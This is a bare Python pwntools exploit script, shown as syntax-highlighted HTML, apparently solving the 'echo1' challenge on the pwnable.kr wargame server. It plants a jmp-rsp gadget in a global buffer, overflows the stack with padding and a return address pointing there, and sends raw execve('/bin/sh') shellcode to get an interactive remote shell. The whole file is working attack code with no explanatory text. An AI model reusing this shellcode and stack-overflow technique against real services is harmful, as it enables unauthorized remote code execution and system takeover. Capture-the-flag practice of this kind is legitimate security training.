<div class="highlight"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">jmp_rsp</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\xff\xe4</span><span class="s">&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span><span class="o">*</span><span class="mi">6</span>
<span class="nb">id</span> <span class="o">=</span> <span class="mh">0x6020a0</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">&quot;</span>


<span class="c">#p = process(&quot;./echo1&quot;)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span> <span class="s">&quot;pwnable.kr&quot;</span><span class="p">,</span> <span class="mi">9010</span> <span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;&gt;&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&quot;1&quot;</span><span class="p">)</span>
<span class="n">payload</span>  <span class="o">=</span> <span class="s">&#39;&#39;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x20</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span> <span class="nb">id</span> <span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>